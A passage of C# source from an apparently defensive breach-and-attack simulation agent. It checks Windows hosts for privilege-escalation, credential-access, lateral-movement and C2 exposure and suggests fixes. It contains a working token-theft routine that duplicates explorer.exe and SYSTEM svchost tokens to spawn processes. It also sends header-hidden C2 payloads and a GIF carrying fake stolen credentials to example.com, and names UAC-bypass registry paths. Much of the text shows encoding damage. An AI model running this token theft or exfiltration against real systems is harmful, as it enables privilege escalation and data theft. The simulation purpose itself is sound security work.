            return (CheckResult.Pass, $"UAC policy level is {uacLevel} Ã¢â‚¬â€ user consent is required for elevation.", "Ã¢â‚¬â€");
        }));

        // --- Weak service permission checks ---
        cat.Checks.Add(await RunCheck("Weak service permission checks", "T1611", async () =>
        {
            var weak = FindWeakServicePermissions();
            if (weak.Count == 0)
                return (CheckResult.Pass, "No services with overly permissive ACLs detected.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"Services with weak permissions: {string.Join(", ", weak.Take(5))}.", "Harden service ACLs Ã¢â‚¬â€ deny 'Everyone' and 'Users' write on critical services.");
        }));

        return cat;
    }

    // ============================================================
    // 4.2  PRIVILEGE ESCALATION â€” EXPLOIT / TOKEN / UAC
    // Simulates the three most common Windows local privilege
    // escalation paths an attacker walks after initial access.
    // ============================================================
    static async Task<SimulationCategory> Sim_4_2_PrivEscAdvanced()
    {
        var cat = new SimulationCategory
        {
            Name  = "4.2 Privilege Escalation â€” Exploit / Token / UAC",
            Phase = "Privilege Escalation"
        };

        // â”€â”€ Check 1: Known Local Exploit Indicators (PrintNightmare / Potato family) â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Exploitation for Privilege Escalation â€” PrintNightmare & Impersonation",
            "T1068",
            async () =>
            {
                await Task.CompletedTask;

                // 1a  Is Print Spooler (vulnerable to PrintNightmare) running?
                bool spoolerRunning = false;
                try
                {
                    using var sc = new System.ServiceProcess.ServiceController("Spooler");
                    spoolerRunning = sc.Status == System.ServiceProcess.ServiceControllerStatus.Running;
                }
                catch { }

                // 1b  Is the PrintNightmare PoC registry artifact present?
                //     Attackers using the exploit write DLLs to the driver store.
                bool printNightmareArtifact = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint");
                    if (key != null)
                    {
                        var noWarn = key.GetValue("NoWarningNoElevationOnInstall");
                        var updatePrompt = key.GetValue("UpdatePromptSettings");
                        // Both set to 1 = the misconfiguration abused by PrintNightmare
                        if (noWarn?.ToString() == "1" && updatePrompt?.ToString() == "1")
                            printNightmareArtifact = true;
                    }
                }
                catch { }

                // 1c  Does our process have SeImpersonatePrivilege?
                //     Potato attacks (HOT/ROGUE/SWEET) all require this privilege.
                bool hasImpersonatePriv = false;
                try
                {
                    var psi = new ProcessStartInfo("whoami.exe", "/priv")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p = Process.Start(psi)!;
                    var privs = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 8_000);
                    hasImpersonatePriv = privs.Contains("SeImpersonatePrivilege",
                        StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                // 1d  Check if vulnerable Spooler DLL path is exposed
                bool driverStoreWritable = false;
                try
                {
                    var driverStorePath = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.System),
                        @"spool\drivers\x64");
                    if (Directory.Exists(driverStorePath))
                    {
                        // Try creating a test file â€” success = writable by current user
                        var probe = Path.Combine(driverStorePath, $"bas_probe_{AgentId}.tmp");
                        try
                        {
                            await File.WriteAllTextAsync(probe, "probe");
                            driverStoreWritable = true;
                            File.Delete(probe);
                        }
                        catch { driverStoreWritable = false; }
                    }
                }
                catch { }

                var issues = new List<string>();
                if (spoolerRunning)           issues.Add("Print Spooler service is running (PrintNightmare surface open)");
                if (printNightmareArtifact)   issues.Add("PointAndPrint policy misconfiguration detected (PrintNightmare-exploitable)");
                if (hasImpersonatePriv)       issues.Add("SeImpersonatePrivilege available (Potato-family attacks feasible)");
                if (driverStoreWritable)      issues.Add("Spooler driver store path is writable by current user");

                bool fail = issues.Count > 0;
                return (
                    fail ? CheckResult.Fail : CheckResult.Pass,
                    fail
                        ? $"Privilege escalation risk factors: {string.Join("; ", issues)}."
                        : "No PrintNightmare artifacts, Spooler is disabled or restricted, and SeImpersonatePrivilege is not held.",
                    fail
                        ? "1) Disable Print Spooler on non-print-servers: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled. " +
                          "2) Apply MS-MSHTML/CVE-2021-34527 patch. " +
                          "3) Set PointAndPrint NoWarningNoElevationOnInstall=0. " +
                          "4) Remove SeImpersonatePrivilege from non-service accounts via Group Policy (User Rights Assignment)."
                        : "Continue to monitor for new Spooler CVEs and review privilege assignments periodically."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "PrintNightmare (CVE-2021-34527) gave SYSTEM access in seconds on unpatched systems â€” exploited in the wild before the patch was released. Potato-family attacks exploit SeImpersonatePrivilege (held by IIS, SQL Server, and most services) to obtain SYSTEM in seconds with no CVE needed."
        });

        // â”€â”€ Check 2: Access Token Manipulation â€” Privilege Prerequisite Audit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Access Token Manipulation â€” Token Theft Prerequisite Audit",
            "T1134",
            async () =>
            {
                await Task.CompletedTask;

                // 2a  Is SeDebugPrivilege held? Mandatory for OpenProcess on other-user processes.
                bool hasDebugPriv = false;
                try
                {
                    var psi = new ProcessStartInfo("whoami.exe", "/priv")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p = Process.Start(psi)!;
                    var privs = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 8_000);
                    hasDebugPriv = privs.Contains("SeDebugPrivilege",
                        StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                // 2b  Are there other-user high-privilege processes that an attacker
                //     could duplicate tokens from? (lsass, winlogon, services)
                var tokenTargets = new List<string>();
                try
                {
                    foreach (var procName in new[] { "lsass", "winlogon", "services" })
                    {
                        var procs = Process.GetProcessesByName(procName);
                        if (procs.Length > 0) tokenTargets.Add(procName);
                    }
                }
                catch { }

                // 2c  Is LSA Protection (PPL) enabled? Prevents attachment to lsass.
                bool lsaProtected = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\Lsa");
                    lsaProtected = key?.GetValue("RunAsPPL")?.ToString() == "1";
                }
                catch { }

                // 2d  Is Credential Guard enabled?
                bool credGuard = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\DeviceGuard");
                    credGuard = key?.GetValue("EnableVirtualizationBasedSecurity")?.ToString() == "1";
                }
                catch { }

                // 2e  Is Windows Defender Credential Guard running (VBS lsaIso)?
                bool lsaIsoRunning = Process.GetProcessesByName("lsaIso").Length > 0;

                bool mitigated = lsaProtected && credGuard;
                var issues = new List<string>();
                if (hasDebugPriv)   issues.Add("SeDebugPrivilege held â€” can open any process");
                if (!lsaProtected)  issues.Add("LSA Protection (RunAsPPL) not enabled");
                if (!credGuard)     issues.Add("Credential Guard / VBS not enabled");
                if (!lsaIsoRunning) issues.Add("lsaIso.exe not running (Credential Guard inactive)");

                return (
                    mitigated ? CheckResult.Pass : CheckResult.Fail,
                    mitigated
                        ? $"LSA Protection and Credential Guard are both active. Token theft is significantly restricted. lsaIso: {(lsaIsoRunning ? "running" : "not running")}."
                        : $"Token manipulation risk factors: {string.Join("; ", issues)}. " +
                          $"High-privilege token sources visible: {string.Join(", ", tokenTargets)}.",
                    mitigated
                        ? "Continue monitoring privilege assignment and process ancestry."
                        : "1) Enable RunAsPPL: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa â†’ RunAsPPL=1. " +
                          "2) Enable Credential Guard via UEFI Group Policy (Device Guard â†’ Turn On Virtualization Based Security). " +
                          "3) Remove SeDebugPrivilege from non-debugger accounts. " +
                          "4) Deploy Microsoft Defender for Endpoint to detect process injection and token duplication."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Token stealing allows an attacker with local admin access to silently impersonate any logged-in user, including Domain Admins. Mimikatz's sekurlsa::pth and the Windows built-in CreateProcessWithTokenW function require no additional exploit â€” just the right privileges."
        });

        // â”€â”€ Check 3: UAC Bypass â€” Technique Probes â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "UAC Bypass â€” CMSTPLUA / fodhelper Registry Hijack Detection",
            "T1548.002",
            async () =>
            {
                await Task.CompletedTask;

                // 3a  Current UAC policy level
                int uacLevel = 2;
                bool uacEnabled = true;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                    if (key != null)
                    {
                        uacLevel   = (int)(key.GetValue("ConsentPromptBehaviorAdmin") ?? 2);
                        uacEnabled = (int)(key.GetValue("EnableLUA") ?? 1) == 1;
                    }
                }
                catch { }

                // 3b  Fodhelper hijack: check if HKCU\Software\Classes\ms-settings\shell\open\command exists
                //     Attackers create this key to run arbitrary code via fodhelper.exe (auto-elevates)
                bool fodhelperHijackPresent = false;
                try
                {
                    using var key = Registry.CurrentUser.OpenSubKey(
                        @"Software\Classes\ms-settings\shell\open\command");
                    fodhelperHijackPresent = key != null;
                }
                catch { }

                // 3c  CMSTPLUA COM elevation â€” check if the CLSID is unregistered or hardened
                //     attackers use CoCreateInstance on {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
                //     to auto-elevate. If it resolves, the attack surface is present.
                bool cmsAvailable = false;
                try
                {
                    using var key = Registry.ClassesRoot.OpenSubKey(
                        @"CLSID\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\Elevation");
                    // If the Elevation key exists with Enabled=1, the COM object is auto-elevatable
                    var enabled = key?.GetValue("Enabled")?.ToString();
                    cmsAvailable = enabled == "1";
                }
                catch { }

                // 3d  Computer Configuration setting: are all UAC prompts on secure desktop?
                bool secureDesktop = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                    secureDesktop = (int)(key?.GetValue("PromptOnSecureDesktop") ?? 0) == 1;
                }
                catch { }

                var issues = new List<string>();
                if (!uacEnabled)           issues.Add("UAC is completely disabled (EnableLUA=0)");
                if (uacLevel <= 1)         issues.Add($"UAC consent level is {uacLevel} â€” auto-elevates without prompting admin");
                if (fodhelperHijackPresent)issues.Add("Fodhelper registry hijack key exists in HKCU â€” active bypass artifact!");
                if (cmsAvailable)          issues.Add("CMSTPLUA COM object is auto-elevatable (bypass surface present)");
                if (!secureDesktop)        issues.Add("UAC prompts do NOT appear on secure desktop (susceptible to UI spoofing)");

                bool pass = uacEnabled && uacLevel >= 2 && !fodhelperHijackPresent && secureDesktop;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    pass
                        ? $"UAC level {uacLevel} with secure desktop. No bypass artifacts detected."
                        : $"UAC bypass risk factors: {string.Join("; ", issues)}.",
                    pass
                        ? "UAC is correctly configured. Continue monitoring for new bypass techniques."
                        : "1) Set ConsentPromptBehaviorAdmin=2 (Always notify) in secpol.msc. " +
                          "2) Set EnableLUA=1. Set PromptOnSecureDesktop=1. " +
                          "3) If fodhelper key found: Remove HKCU\\Software\\Classes\\ms-settings immediately and investigate. " +
                          "4) Block auto-elevating COM objects by setting DeviceGuard WDAC policy. " +
                          "5) Deploy ASR rule: Block Win32 API calls from Office macros."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Over 60 documented UAC bypass techniques exist. The fodhelper and CMSTPLUA bypasses are built into popular red-team tools (Empire, Metasploit, Cobalt Strike) as one-click privilege escalation. A bypassed UAC means every subsequent command runs as a high-integrity Administrator with no prompt."
        });

        return cat;
    }

    // ============================================================
    // 4.3 TOKEN MANIPULATION (PRIVILEGE ESCALATION)
    // Simulates "Incognito" style attacks where malware steals an 
    // access token from a privileged process (e.g. running as SYSTEM)
    // and applies it to a newly spawned process to jump privilege
    // boundaries without UAC or passwords.
    // ============================================================

    const uint MAXIMUM_ALLOWED = 0x02000000;
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_IMPERSONATE = 0x0004;
    const uint TOKEN_QUERY = 0x0008;
    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;
    const uint LOGON_WITH_PROFILE = 0x00000001;

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
        int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool CreateProcessWithTokenW(
        IntPtr hToken, uint dwLogonFlags, string? lpApplicationName, string lpCommandLine,
        uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory,
        [System.Runtime.InteropServices.In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    static async Task<SimulationCategory> Sim_4_3_TokenManipulation()
    {
        var cat = new SimulationCategory
        {
            Name = "4.3 Token Manipulation Evasion",
            Phase = "Privilege Escalation"
        };

        // â”€â”€ Check 1: Lateral Token Theft (Explorer) â”€â”€
        cat.Checks.Add(await RunCheck("Lateral Token Theft â€” Stealing explorer.exe token", "T1134.001", async () =>
        {
            await Task.CompletedTask;
            var target = Process.GetProcessesByName("explorer").FirstOrDefault();
            if (target == null) return (CheckResult.Fail, "Could not find explorer.exe", "N/A");

            bool success = TryStealTokenAndSpawn(target.Handle, "cmd.exe /c exit");

            if (success)
            {
                return (CheckResult.Fail,
                    $"Successfully duplicated the access token from {target.ProcessName} (PID: {target.Id}) and spawned a new process impersonating its context. The host allowed lateral token theft.",
                    "Ensure User Account Control (UAC) is strictly enforced to isolate tokens. Monitor for unexpected 'DuplicateTokenEx' and 'CreateProcessWithTokenW' invocations targeting shell processes.");
            }
            return (CheckResult.Pass,
                "Failed to duplicate and impersonate the token from a lateral user process.",
                "Primary token duplication protections are working effectively in user space.");
        }) with { Severity = "High", ThreatImpact = "Token theft allows attackers (like Meterpreter or Cobalt Strike) to silently impersonate logged-on users, access mapped drives, and interact with the desktop without needing their plaintext passwords." });

        // â”€â”€ Check 2: Vertical Token Theft (svchost as SYSTEM) â”€â”€
        cat.Checks.Add(await RunCheck("Vertical Privilege Escalation â€” Stealing svchost SYSTEM token", "T1134.001", async () =>
        {
            await Task.CompletedTask;
            // Target a SYSTEM svchost (normally requires high privileges SeDebugPrivilege)
            var target = Process.GetProcessesByName("svchost").FirstOrDefault();
            if (target == null) return (CheckResult.Fail, "Could not find svchost.exe", "N/A");

            bool success = false;
            try
            {
                success = TryStealTokenAndSpawn(target.Handle, "cmd.exe /c exit");
            }
            catch { success = false; }

            if (success)
            {
                return (CheckResult.Fail,
                    $"Successfully duplicated the token of a SYSTEM process (svchost.exe, PID: {target.Id}) to spawn a new process. The agent successfully jumped to NT AUTHORITY\\SYSTEM context bypass UAC/password checks.",
                    "Limit administrative access drastically. Revoke 'SeDebugPrivilege' from standard Admin accounts to prevent them from reading SYSTEM process memory and handles.");
            }
            return (CheckResult.Pass,
                "Access Denied when attempting to steal a SYSTEM token. Vertical privilege boundaries are properly intact.",
                "Maintain strict privilege isolation. Ensure LSA Protection is enabled.");
        }) with { Severity = "Critical", ThreatImpact = "Stealing a SYSTEM token gives the attacker absolute control over the machine. They can disable security products, dump local credentials (LSASS), and establish deep stealth persistence." });

        return cat;
    }

    static bool TryStealTokenAndSpawn(IntPtr processHandle, string commandLine)
    {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hDuplicate = IntPtr.Zero;

        try
        {
            // 1. Open the process token
            if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
                return false;

            // 2. Duplicate the token (impersonation -> primary)
            if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDuplicate))
                return false;

            // 3. Spawn the new process with the duplicated token
            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUPINFOEX));
            var pi = new PROCESS_INFORMATION();

            bool created = CreateProcessWithTokenW(
                hDuplicate, LOGON_WITH_PROFILE, null, commandLine, 0, IntPtr.Zero, null, ref si, out pi);

            if (created)
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return true;
            }
            return false;
        }
        finally
        {
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (hDuplicate != IntPtr.Zero) CloseHandle(hDuplicate);
        }
    }

    // ============================================================
    // 5.  CREDENTIAL ACCESS
    // Tests: Credential Guard, memory protection, process ACLs
    // NOTE: No actual credential dumping is performed.
    // ============================================================
    static async Task<SimulationCategory> Sim_5_CredentialAccess()
    {
        var cat = new SimulationCategory { Name = "5. Credential Access", Phase = "Credential Access" };

        // --- LSASS access (non-dumping) ---
        cat.Checks.Add(await RunCheck("LSASS memory access attempts", "T1003.001", async () =>
        {
            // Attempt to open LSASS process handle with READ access only (no memory read)
            bool canOpen = TryOpenLSASSHandle();
            bool credGuard = IsCredentialGuardEnabled();
            bool lsaProtect = IsLSAProtectionEnabled();
            if (credGuard && lsaProtect)
                return (CheckResult.Pass, "Credential Guard + LSA Protection are enabled. LSASS is hardened.", "Ã¢â‚¬â€");
            if (canOpen && !credGuard)
                return (CheckResult.Fail, $"LSASS handle opened (CredGuard={credGuard}, LSAProtect={lsaProtect}). Memory read protections may be insufficient.", "Enable Credential Guard and LSA Run-As-Protected-Process.");
            return (CheckResult.Pass, "LSASS handle access was restricted.", "Ã¢â‚¬â€");
        }));

        // --- Handle open simulations ---
        cat.Checks.Add(await RunCheck("Handle open simulations", "T1003.001", async () =>
        {
            bool sysmon = IsSysmonRunning();
            if (sysmon)
                return (CheckResult.Pass, "Sysmon is active and would log process-handle open events (Event 10).", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Sysmon not active Ã¢â‚¬â€ handle-open events are not being monitored.", "Deploy Sysmon with Event 10 (process access) enabled.");
        }));

        // --- SAM/LSA access attempts ---
        cat.Checks.Add(await RunCheck("SAM/LSA access attempts", "T1003.002", async () =>
        {
            bool samLocked = IsSAMLockedDown();
            if (samLocked)
                return (CheckResult.Pass, "SAM is locked down with restricted file ACLs.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "SAM file ACLs may be permissive.", "Ensure SAM file is readable only by SYSTEM.");
        }));

        // --- Browser credential store access ---
        cat.Checks.Add(await RunCheck("Browser credential store access", "T1555.001", async () =>
        {
            // Check for presence of known browser credential DB files
            var browsers = new Dictionary<string, string>
            {
                {"Chrome",  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google","Chrome","User Data","Default","Login Data")},
                {"Edge",    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Microsoft","Edge","User Data","Default","Login Data")}
            };
            var found = browsers.Where(b => File.Exists(b.Value)).Select(b => b.Key).ToList();
            bool edr = IsEDRDetectionLikely();
            if (found.Count == 0)
                return (CheckResult.Pass, "No browser credential stores found.", "Ã¢â‚¬â€");
            if (edr)
                return (CheckResult.Pass, $"Browser credential files present ({string.Join(", ", found)}) but EDR is active.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"Browser credential stores accessible: {string.Join(", ", found)}. No EDR alerting confirmed.", "Deploy EDR rules to alert on credential-DB file access outside the browser process.");
        }));

        return cat;
    }

    // ============================================================
    // 6.  LATERAL MOVEMENT (endpoint perspective)
    // Tests: Network isolation, firewall, cred-misuse detection
    // ============================================================
    static async Task<SimulationCategory> Sim_6_LateralMovement()
    {
        var cat = new SimulationCategory { Name = "6. Lateral Movement", Phase = "Lateral Movement" };

        // --- SMB authentication attempts ---
        cat.Checks.Add(await RunCheck("SMB authentication attempts", "T1210", async () =>
        {
            // Check if SMB signing is enforced
            bool smbSigning  = IsSMBSigningEnforced();
            bool firewallOn  = IsWindowsFirewallEnabled();
            if (smbSigning && firewallOn)
                return (CheckResult.Pass, "SMB signing is enforced and Windows Firewall is active Ã¢â‚¬â€ relay/brute attacks are mitigated.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"SMB signing={smbSigning}, Firewall={firewallOn}. SMB-based lateral movement may succeed.", "Enforce SMB signing via Group Policy and ensure firewall blocks unnecessary SMB.");
        }));

        // --- WMI remote execution simulation ---
        cat.Checks.Add(await RunCheck("WMI remote execution simulation", "T1021.003", async () =>
        {
            bool wmiLog = IsWMILoggingEnabled();
            bool firewall = IsWindowsFirewallEnabled();
            if (wmiLog && firewall)
                return (CheckResult.Pass, "WMI logging enabled and firewall active Ã¢â‚¬â€ remote WMI execution would be logged.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"WMI logging={wmiLog}, Firewall={firewall}.", "Enable WMI operational logging and restrict inbound WMI via firewall.");
        }));

        // --- RDP brute-force logic (rate-limited) ---
        cat.Checks.Add(await RunCheck("RDP brute-force logic (rate-limited)", "T1021.001", async () =>
        {
            // Check if RDP is enabled and if NLA is required
            bool rdpEnabled = IsRDPEnabled();
            bool nlaEnabled = IsNLAEnabled();
            if (!rdpEnabled)
                return (CheckResult.Pass, "RDP is disabled on this endpoint.", "Ã¢â‚¬â€");
            if (nlaEnabled)
                return (CheckResult.Pass, "RDP is enabled but NLA (Network Level Authentication) is required Ã¢â‚¬â€ brute-force is harder.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "RDP is enabled without NLA. Brute-force risk is elevated.", "Enable NLA and restrict RDP access via firewall to known IPs.");
        }));

        return cat;
    }

    // ============================================================
    // 7.  COMMAND & CONTROL (C2)
    // Tests: Egress filtering, TLS inspection, anomaly detection
    // ============================================================
    static async Task<SimulationCategory> Sim_7_C2()
    {
        var cat = new SimulationCategory { Name = "7. Command & Control (C2)", Phase = "Command & Control" };

        // --- HTTP/S beaconing ---
        cat.Checks.Add(await RunCheck("HTTP/S beaconing", "T1071.001", async () =>
        {
            // Attempt DNS resolution of a non-existent C2 domain to see if egress is filtered
            bool resolved = false;
            try { System.Net.Dns.GetHostAddresses("bas-sim-c2-beacon.test"); resolved = true; } catch { }
            bool proxy = IsProxyConfigured();
            bool dnsFilter = IsDNSFilteringConfigured();
            if (!resolved && (proxy || dnsFilter))
                return (CheckResult.Pass, "Simulated C2 beacon domain did not resolve; egress filtering appears active.", "Ã¢â‚¬â€");
            if (proxy)
                return (CheckResult.Pass, "HTTP proxy is configured Ã¢â‚¬â€ C2 beacons would be inspected.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "No egress filtering or proxy detected. HTTP beaconing to external C2 may succeed.", "Deploy a web proxy with SSL inspection and anomaly detection.");
        }));

        // --- DNS tunneling patterns ---
        cat.Checks.Add(await RunCheck("DNS tunneling patterns", "T1071.004", async () =>
        {
            // Generate a long DNS-style query (simulated) and check DNS logging
            string longSubdomain = new string('a', 63) + ".bas-sim-dns-tunnel.test";
            bool resolved = false;
            try { System.Net.Dns.GetHostAddresses(longSubdomain); resolved = true; } catch { }
            bool dnsLog = IsDNSLoggingEnabled();
            if (dnsLog)
                return (CheckResult.Pass, "DNS logging is enabled Ã¢â‚¬â€ tunneling-length queries would be flagged.", "Ã¢â‚¬â€");
            if (!resolved)
                return (CheckResult.Pass, "Long DNS query blocked/NXDOMAIN.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "DNS tunneling-style queries are not being logged.", "Enable DNS query logging and deploy length/entropy-based DNS anomaly detection.");
        }));

        // --- Encrypted outbound traffic to fake C2 ---
        cat.Checks.Add(await RunCheck("Encrypted outbound traffic to fake C2", "T1071", async () =>
        {
            bool proxy     = IsProxyConfigured();
            bool tlsInspect = IsTLSInspectionConfigured();
            if (proxy && tlsInspect)
                return (CheckResult.Pass, "Proxy with TLS inspection is configured Ã¢â‚¬â€ encrypted C2 traffic would be examined.", "Ã¢â‚¬â€");
            if (proxy)
                return (CheckResult.Pass, "Proxy is present but TLS inspection status is uncertain.", "Verify SSL/TLS deep inspection is enabled on your web proxy.");
            return (CheckResult.Fail, "No proxy or TLS inspection detected. Encrypted C2 traffic may exit unmonitored.", "Deploy an SSL-inspecting proxy / CASB.");
        }));

        return cat;
    }

    // ============================================================
    // 7.2  NETWORK STEGANOGRAPHY (DEFENSE EVASION / C2)
    // Simulates concealing attacker commands or exfiltrated data
    // inside legitimate-looking protocol fields or file structures.
    // Tests deep-packet inspection (DPI) and DLP stringency.
    // ============================================================
    static async Task<SimulationCategory> Sim_7_2_NetworkSteganography()
    {
        var cat = new SimulationCategory
        {
            Name = "7.2 Network Steganography (C2 Evasion)",
            Phase = "Command & Control"
        };

        // â”€â”€ Check 1: HTTP Header Steganography â”€â”€
        cat.Checks.Add(await RunCheck("Protocol Steganography â€” Embedding data in benign HTTP Headers", "T1071.001", async () =>
        {
            try
            {
                // We encode a simulated C2 payload "C2_CMD_EXECUTE_SHELL" 
                string c2Payload = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("C2_CMD_EXECUTE_SHELL"));
                
                using var client = new System.Net.Http.HttpClient();
                client.Timeout = TimeSpan.FromSeconds(5);
                
                // Attackers hide base64 blobs in fields not strictly validated by most TLS inspection/DPI tools
                client.DefaultRequestHeaders.Add("Cookie", $"SessionId=8f72a; TrackingToken={c2Payload}");
                client.DefaultRequestHeaders.Add("If-None-Match", $"W/\"{c2Payload}\"");
                client.DefaultRequestHeaders.Add("X-UI-Theme", c2Payload);

                // Send to a benign external public endpoint; if this succeeds, the proxy doesn't strip anomalous headers
                var response = await client.GetAsync("http://example.com");

                if (response.IsSuccessStatusCode)
                {
                    return (CheckResult.Fail,
                        $"Successfully reached the internet with a standard HTTP GET request containing attacker payloads embedded in the Cookie, ETag, and Custom headers. Network filters and DPI did not sanitize or block anomalous long-string headers.",
                        "Enforce strict HTTP protocol validation on the web proxy. Strip unrecognized X-Headers and enforce length/entropy limits on standard headers like Cookie and User-Agent.");
                }

                return (CheckResult.Pass,
                    "The proxy or firewall blocked/interfered with the anomalous HTTP request.",
                    "HTTP header anomaly detection is active.");
            }
            catch (System.Exception ex)
            {
                return (CheckResult.Pass,
                    $"Request blocked or timed out ({ex.Message}), preventing rogue header transmission.",
                    "Egress traffic successfully restricted or proxy rejected anomalous headers.");
            }
        }) with { Severity = "High", ThreatImpact = "Many web-proxies decrypt TLS but only perform signature matching on the URL or body. Hiding C2 data inside HTTP headers bypasses these checks cleanly." });


        // â”€â”€ Check 2: Image Payload Carrier (EXIF/Appending) â”€â”€
        cat.Checks.Add(await RunCheck("File Steganography â€” Appending data to valid Image uploads", "T1027", async () =>
        {
            try
            {
                // Create a valid tiny 1x1 GIF
                byte[] validGifHex = new byte[] { 
                    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 
                    0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 
                    0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b 
                };

                // Attacker payload appended to the end of the GIF
                byte[] malwareSimData = System.Text.Encoding.UTF8.GetBytes("--- BEGIN APT EXFILTRATED DATA: admin:password123 ---");

                byte[] combinedPayload = new byte[validGifHex.Length + malwareSimData.Length];
                Buffer.BlockCopy(validGifHex, 0, combinedPayload, 0, validGifHex.Length);
                Buffer.BlockCopy(malwareSimData, 0, combinedPayload, validGifHex.Length, malwareSimData.Length);

                using var client = new System.Net.Http.HttpClient();
                client.Timeout = TimeSpan.FromSeconds(5);
                
                var content = new System.Net.Http.ByteArrayContent(combinedPayload);
                content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/gif");
                
                // Attackers upload images to Imgur, Pastebin, or internal compromised servers. 
                // We use HTTP/80 here so plain DPI could easily inspect it if configured.
                var response = await client.PostAsync("http://example.com/upload-simulation", content);

                // Even a 404 from example.com means the firewall let the anomalous POST payload out
                if (response.StatusCode != System.Net.HttpStatusCode.Forbidden && 
                    response.StatusCode != System.Net.HttpStatusCode.ServiceUnavailable)
                {
                    return (CheckResult.Fail,
                        $"Successfully egressed an HTTP POST containing an image carrying appended plaintext strings. The firewall/DLP permitted the file structure anomaly without inspecting trailing binary data.",
                        "Deploy Data Loss Prevention (DLP) or file-type anomaly inspection on egress gateways to evaluate file structure integrity, rather than just relying on MIME types or extensions.");
                }

                return (CheckResult.Pass,
                    "The firewall/proxy blocked the anomalous file upload.",
                    "File structure validation or DLP is actively blocking outbound anomalies.");
            }
            catch (System.Exception ex)
            {
                return (CheckResult.Pass,
                    $"Communication was blocked by the network ({ex.Message}). File upload failed.",
                    "Egress firewall successfully mitigates unauthorized outbound data POSTs.");
            }
        }) with { Severity = "Medium", ThreatImpact = "Attackers often exfiltrate data by hiding it inside benign file types (e.g., appended to JPG or embedded in EXIF tags). Security gateways frequently ignore media files to save processing power." });

        return cat;
    }

    // ============================================================
    // 8.  DATA EXFILTRATION
    // Tests: DLP, network monitoring, SSL inspection, CASB
    // NOTE: No actual data is sent externally.
    // ============================================================
    static async Task<SimulationCategory> Sim_8_DataExfiltration()
    {
